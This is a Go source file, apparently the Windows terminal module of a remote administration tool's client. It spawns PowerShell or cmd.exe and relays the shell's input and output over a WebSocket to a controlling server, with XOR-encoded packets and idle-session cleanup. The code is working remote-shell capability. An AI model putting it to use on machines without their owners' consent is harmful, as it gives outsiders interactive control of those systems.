package terminal

import (
	"Spark/client/common"
	"Spark/modules"
	"Spark/utils"
	"Spark/utils/cmap"
	"encoding/hex"
	"io"
	"os/exec"
	"reflect"
	"syscall"
	"time"
)

type terminal struct {
	lastPack int64
	rawEvent []byte
	escape   bool
	event    string
	cmd      *exec.Cmd
	stdout   *io.ReadCloser
	stderr   *io.ReadCloser
	stdin    *io.WriteCloser
}

var terminals = cmap.New[*terminal]()
var defaultCmd = ``

func init() {
	defer func() {
		recover()
	}()
	{
		kernel32 := syscall.NewLazyDLL(`kernel32.dll`)
		kernel32.NewProc(`SetConsoleCP`).Call(65001)
		kernel32.NewProc(`SetConsoleOutputCP`).Call(65001)
	}
	go healthCheck()
}

func InitTerminal(pack modules.Packet) error {
	cmd := exec.Command(getTerminal())
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return err
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	rawEvent, _ := hex.DecodeString(pack.Event)
	session := &terminal{
		cmd:      cmd,
		event:    pack.Event,
		escape:   false,
		stdout:   &stdout,
		stderr:   &stderr,
		stdin:    &stdin,
		rawEvent: rawEvent,
		lastPack: utils.Unix,
	}

	readSender := func(rc io.ReadCloser) {
		bufSize := 1024
		for !session.escape {
			buffer := make([]byte, 1024)
			n, err := rc.Read(buffer)
			buffer = buffer[:n]

			// if output is larger than 1KB, then send binary data
			if n > 1024 {
				if bufSize < 32768 {
					bufSize *= 2
				}
				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 00)
			} else {
				bufSize = 1024
				buffer, _ = utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_OUTPUT`, Data: map[string]any{
					`output`: hex.EncodeToString(buffer),
				}})
				buffer = utils.XOR(buffer, common.WSConn.GetSecret())
				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 01)
			}

			session.lastPack = utils.Unix
			if err != nil {
				session.escape = true
				data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`})
				data = utils.XOR(data, common.WSConn.GetSecret())
				common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
				break
			}
		}
	}
	go readSender(stdout)
	go readSender(stderr)

	err = cmd.Start()
	if err != nil {
		session.escape = true
		return err
	}
	terminals.Set(pack.Data[`terminal`].(string), session)
	return nil
}

func InputRawTerminal(input []byte, uuid string) {
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	(*session.stdin).Write(input)
	session.lastPack = utils.Unix
}

func InputTerminal(pack modules.Packet) {
	var err error
	var uuid string
	var input []byte
	var session *terminal

	if val, ok := pack.GetData(`input`, reflect.String); !ok {
		return
	} else {
		if input, err = hex.DecodeString(val.(string)); err != nil {
			return
		}
	}
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
		if val, ok = terminals.Get(uuid); ok {
			session = val.(*terminal)
		} else {
			return
		}
	}
	(*session.stdin).Write(input)
	session.lastPack = utils.Unix
}

func ResizeTerminal(pack modules.Packet) error {
	return nil
}

func KillTerminal(pack modules.Packet) {
	var uuid string
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	terminals.Remove(uuid)
	data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`, Msg: `${i18n|TERMINAL.SESSION_CLOSED}`})
	data = utils.XOR(data, common.WSConn.GetSecret())
	common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
	session.escape = true
	session.rawEvent = nil
}

func PingTerminal(pack modules.Packet) {
	var uuid string
	var session *terminal
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	session.lastPack = utils.Unix
}

func doKillTerminal(terminal *terminal) {
	(*terminal.stdout).Close()
	(*terminal.stderr).Close()
	(*terminal.stdin).Close()
	if terminal.cmd.Process != nil {
		terminal.cmd.Process.Kill()
		terminal.cmd.Process.Wait()
		terminal.cmd.Process.Release()
	}
}

func getTerminal() string {
	var cmdTable = []string{
		`powershell.exe`,
		`cmd.exe`,
	}
	if defaultCmd != `` {
		return defaultCmd
	}
	for _, cmd := range cmdTable {
		if _, err := exec.LookPath(cmd); err == nil {
			defaultCmd = cmd
			return cmd
		}
	}
	return `cmd.exe`
}

func healthCheck() {
	const MaxInterval = 300
	for now := range time.NewTicker(30 * time.Second).C {
		timestamp := now.Unix()
		// stores sessions to be disconnected
		keys := make([]string, 0)
		terminals.IterCb(func(uuid string, session *terminal) bool {
			if timestamp-session.lastPack > MaxInterval {
				keys = append(keys, uuid)
				doKillTerminal(session)
			}
			return true
		})
		terminals.Remove(keys...)
	}
}
